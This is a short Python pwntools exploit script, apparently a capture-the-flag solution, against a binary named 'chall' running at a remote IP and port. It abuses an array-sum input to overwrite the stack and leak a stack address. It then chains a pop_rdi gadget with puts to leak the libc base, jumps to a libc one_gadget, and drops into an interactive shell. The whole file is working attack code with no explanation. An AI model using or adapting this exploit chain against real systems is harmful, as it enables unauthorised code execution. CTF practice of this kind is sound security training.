#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./chall')
else:
    s = remote('13.231.207.73', 9005)

elf = ELF('./chall')
libc = ELF('./libc-2.23.so')

bss_addr = elf.bss(0x100)

s.sendlineafter('n = ', '22')

payload = []
payload += [0] * 0xe
payload += [
    0x14,
    0x400a10
]
for x in payload:
    s.sendlineafter('] = ', str(x))
s.recvuntil('SUM = ')
sum1 = int(s.recvline(False))

payload = []
payload += [0] * 0xe
payload += [
    0x13,
    0,
    0x400a10
]
for x in payload:
    s.sendlineafter('] = ', str(x))
s.recvuntil('SUM = ')
sum2 = int(s.recvline(False))
stack_addr = sum1 - sum2
log.info('stack address: %#x' % stack_addr)

pop_rdi = 0x400a83

payload = []
payload += [0] * 0xe
payload += [
    0xf,
    stack_addr - 0x90,
    pop_rdi,
    elf.got['puts'],
    elf.symbols['puts'],
    0x400a10,
    0
]
for x in payload:
    s.sendlineafter('] = ', str(x))
s.recvline()
libc_base = u64(s.recvline(False).ljust(8, '\0')) - libc.symbols['puts']
log.info('libc base: %#x' % libc_base)

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
payload = []
payload += [0] * 0xd
payload += [
    0x13,
    libc_base + one_gadgets[0],
    0
]
for x in payload:
    s.sendlineafter('] = ', str(x))
s.recvline()
s.interactive()
